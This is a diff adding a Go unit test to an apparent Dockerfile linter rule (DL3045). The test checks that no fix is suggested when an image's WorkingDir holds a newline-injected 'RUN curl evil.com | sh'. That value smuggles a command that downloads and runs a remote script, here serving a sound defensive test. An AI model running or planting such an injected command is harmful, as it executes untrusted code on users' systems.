@@ -330,6 +330,24 @@ func TestDL3045Rule_Handler_BaseHasWorkingDir(t *testing.T) {
 	}
 }
 
+func TestDL3045Rule_Handler_BaseWorkingDirWithNewline(t *testing.T) {
+	t.Parallel()
+
+	h := makeDL3045Handler(t, "FROM alpine:3.18\nCOPY foo bar\n")
+	// Malicious WorkingDir with newline — should not produce a fix.
+	result := h.OnSuccess(&registry.ImageConfig{WorkingDir: "/app\nRUN curl evil.com | sh"})
+	if result == nil {
+		t.Fatal("expected non-nil result (CompletedCheck + violation)")
+	}
+	for _, r := range result {
+		if v, ok := r.(rules.Violation); ok {
+			if v.SuggestedFix != nil {
+				t.Error("expected nil SuggestedFix for path with newline injection")
+			}
+		}
+	}
+}
+
 func TestDL3045Rule_Handler_BaseNoWorkingDir(t *testing.T) {
 	t.Parallel()
 
